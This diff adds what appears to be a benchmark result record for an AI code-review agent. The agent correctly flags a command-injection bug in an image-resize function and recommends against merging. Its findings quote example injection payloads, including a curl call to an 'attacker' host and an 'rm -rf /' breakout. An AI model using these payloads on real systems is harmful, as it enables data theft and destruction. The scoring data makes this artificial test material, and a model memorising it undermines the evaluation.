@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 73.7,
+  "setup_seconds": 0.0,
+  "total_seconds": 73.7,
+  "usage": {
+    "in": 33575,
+    "cache_read": 120448,
+    "cache_write": 0,
+    "out": 3824,
+    "source": "cli"
+  },
+  "cost_usd": 0.1262284,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Issue:** Replacing `execFile` with `exec` and building the command via template-string interpolation lets caller-controlled `filter` and `src` execute arbitrary shell commands.\n\n**Failure mode:** `filter` is unquoted, so a value like `Lanczos; curl http://attacker/$(id)` runs after `convert`. `src` is only double-quoted, so a path containing `\"` still breaks out (e.g. `x\"; rm -rf /; echo \"`). The PR description frames these as user-composed filter expressions, so this is attacker-reachable if any untrusted input reaches `resize`.\n\n**Fix:** Keep a no-shell spawn and pass arguments as a list. ImageMagick does not need a shell for `-filter`:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nRestore `import { execFile } from \"child_process\"`. If filters are user-supplied, allowlist known ImageMagick filter names before invoking `convert`."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 4,
+      "severity": "warning",
+      "body": "**Issue:** The comment states that `-filter` needs a shell for user-composed expressions. That rationale is false and is what justified the unsafe `exec` switch.\n\n**Failure mode:** Future maintainers will keep the shell path because the comment presents it as a hard requirement, locking in the injection surface.\n\n**Fix:** Delete the comment (or replace it with a note that filter names must be allowlisted) and pass `-filter` / the filter value as separate `execFile` argv entries. Shell metacharacters are never required to supply a filter name or a single expression token to ImageMagick."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching from `execFile` (argv array, no shell) to `exec` (shell) and interpolating caller-controlled `src` and `filter` into the command string.\n\n## Why this is blocking\n\n`child_process.exec` runs the command through `/bin/sh`. Any metacharacters in `filter` or a quote-break in `src` become shell syntax:\n\n- `filter = \"Lanczos; id\"` runs `id` after `convert`\n- `src` containing `\"` breaks out of the double-quoted path and can chain arbitrary commands\n\nThe inline comment claims a shell is required for `-filter` expressions. That is incorrect: ImageMagick accepts the filter as a normal argv element, so `execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", f\"{w}x\", \"/tmp/out.png\"], ...)` preserves the previous no-shell boundary.\n\nIf `filter` is truly user-composed, also allowlist known filter names (or a strict grammar) even when using `execFile`, so hostile values cannot be turned into extra `convert` arguments.\n\n## API note\n\nAdding `filter` as the second parameter changes the public signature from `(src, w)` to `(src, filter, w)`. Coordinate callers or place the new argument last with a default if this module is already consumed outside this repo.\n\n## Release decision\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The change replaces safe execFile argv passing with exec and unquoted/poorly quoted interpolation of caller-controlled `filter` and `src`, enabling shell command injection. Base used execFile without a shell; the head code at line 6 is a real critical RCE vector."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 4,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 11.627,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2799,
+      "out": 452
+    },
+    "cost_usd": 0.009283
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
